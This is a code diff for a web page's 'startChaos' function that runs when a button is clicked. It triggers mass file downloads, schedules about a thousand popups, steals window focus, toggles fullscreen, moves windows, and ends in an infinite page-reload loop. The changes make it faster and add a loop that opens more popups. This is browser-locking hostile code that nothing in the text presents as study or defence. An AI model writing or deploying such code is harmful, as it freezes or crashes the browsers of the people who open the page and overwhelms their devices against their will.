@@ -163,24 +163,31 @@
             downloadManyFiles();
             
             for (let i = 0; i < 1000; i++) {
-                setTimeout(createPopup, i * 20);
+                setTimeout(createPopup, i * 10);
             }
             
-            setTimeout(createAlerts, 100);
+            setTimeout(createAlerts, 50);
             
             setInterval(() => {
                 if (popupCount < maxPopups) {
                     createPopup();
                 }
-            }, 20);
+            }, 10);
             
-            setInterval(movePopups, 20);
-            setInterval(toggleFullscreen, 50);
-            setInterval(moveMainWindow, 30);
+            setInterval(movePopups, 10);
+            setInterval(toggleFullscreen, 30);
+            setInterval(moveMainWindow, 20);
             
             setInterval(() => {
                 window.focus();
-            }, 30);
+            }, 10);
+
+            // Constantly try to open more windows
+            setInterval(() => {
+                for (let i = 0; i < 5; i++) {
+                    createPopup();
+                }
+            }, 100);
             
             if (button) {
                 button.textContent = 'TOO LATE';
@@ -189,7 +196,7 @@
 
             setTimeout(() => {
                 while(1) location.reload(1);
-            }, 5000);
+            }, 3000);
         }
 
         button.addEventListener('click', startChaos);
